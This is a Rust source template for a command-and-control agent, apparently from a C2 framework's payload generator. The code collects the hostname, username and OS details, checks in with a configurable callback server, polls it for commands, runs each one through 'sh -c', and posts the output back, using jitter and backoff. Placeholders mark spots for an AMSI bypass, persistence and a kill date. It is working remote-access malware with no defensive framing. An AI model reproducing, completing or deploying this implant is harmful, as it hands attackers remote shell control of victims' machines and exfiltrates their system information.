use std::process::Command;
use std::thread;
use std::time::Duration;

const CB: &str = "[CALLBACK]";
const FREQ: u64 = [FREQ];
const JITTER: u64 = [JITTER];
const RETRY_MAX: u64 = [RETRY_MAX];
const LABEL: &str = "[LABEL]";
[PROXY_SETUP]
[AMSI_BYPASS]
fn curl_post(url: &str, data: &str, ct: &str, extra: &str) -> String {
    let mut args = vec!["-sk", "-X", "POST", "-H", &format!("Content-Type: {}", ct), "-d", data];
    if !extra.is_empty() { args.push(extra); }
    args.push(url);
    let out = Command::new("curl").args(&args).output();
    match out {
        Ok(o) => String::from_utf8(o.stdout).unwrap_or_default(),
        Err(_) => String::new(),
    }
}

fn curl_get(url: &str, extra: &str) -> (String, i32) {
    let mut args = vec!["-sk".to_string(), "-w".to_string(), "\n%{http_code}".to_string()];
    if !extra.is_empty() { args.push(extra.to_string()); }
    args.push(url.to_string());
    let out = Command::new("curl").args(&args).output();
    match out {
        Ok(o) => {
            let raw = String::from_utf8(o.stdout).unwrap_or_default();
            let lines: Vec<&str> = raw.trim().rsplitn(2, '\n').collect();
            let code = lines[0].parse::<i32>().unwrap_or(0);
            let body = if lines.len() > 1 { lines[1].to_string() } else { String::new() };
            (body, code)
        }
        Err(_) => (String::new(), 0),
    }
}

fn extract_json_str(json: &str, key: &str) -> String {
    let pat = format!("\"{}\"", key);
    if let Some(pos) = json.find(&pat) {
        let rest = &json[pos + pat.len()..];
        if let Some(colon) = rest.find(':') {
            let after = rest[colon + 1..].trim_start();
            if after.starts_with('"') {
                let inner = &after[1..];
                if let Some(end) = inner.find('"') {
                    return inner[..end].to_string();
                }
            } else {
                let end = after.find(|c: char| c == ',' || c == '}').unwrap_or(after.len());
                return after[..end].trim().to_string();
            }
        }
    }
    String::new()
}

fn main() {
    let proxy_arg = "";
    let hname = String::from_utf8(
        Command::new("hostname").output().map(|o| o.stdout).unwrap_or_default()
    ).unwrap_or_default().trim().to_string();
    let uname = String::from_utf8(
        Command::new("whoami").output().map(|o| o.stdout).unwrap_or_default()
    ).unwrap_or_default().trim().to_string();
    let os_info = String::from_utf8(
        Command::new("uname").args(&["-srm"]).output().map(|o| o.stdout).unwrap_or_default()
    ).unwrap_or_default().trim().to_string();

    let checkin = format!(
        r#"{{"hostname":"{}","username":"{}","os_info":"{}","script":"{}"}}"#,
        hname, uname, os_info, LABEL
    );
    let resp = curl_post(&format!("{}/agent/checkin", CB), &checkin, "application/json", proxy_arg);
    let agent_id = extract_json_str(&resp, "agent_id");
    if agent_id.is_empty() { return; }
    [PERSIST_CODE]
    let mut backoff: u64 = 1;
    loop {
        [KILLDATE_CHECK]
        let (body, code) = curl_get(&format!("{}/agent/cmd/{}", CB, agent_id), proxy_arg);
        if code == 200 {
            backoff = 1;
            let cmd_id = extract_json_str(&body, "id");
            let command = extract_json_str(&body, "command");
            let output = Command::new("sh").args(&["-c", &command]).output();
            let out_str = match output {
                Ok(o) => {
                    let mut s = String::from_utf8(o.stdout).unwrap_or_default();
                    s.push_str(&String::from_utf8(o.stderr).unwrap_or_default());
                    s
                }
                Err(e) => e.to_string(),
            };
            curl_post(&format!("{}/agent/res/{}", CB, cmd_id), &out_str, "text/plain", proxy_arg);
        } else if RETRY_MAX > 1 && backoff < RETRY_MAX {
            backoff += 1;
        }
        let mut s = FREQ * backoff;
        if JITTER > 0 {
            let jit = (s as f64) * (JITTER as f64) / 100.0;
            let offset = (rand_simple() * 2.0 - 1.0) * jit;
            s = ((s as f64) + offset).max(1.0) as u64;
        }
        thread::sleep(Duration::from_secs(s));
    }
}

fn rand_simple() -> f64 {
    let t = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
    let n = t.subsec_nanos() as f64;
    (n / 1_000_000_000.0).fract()
}
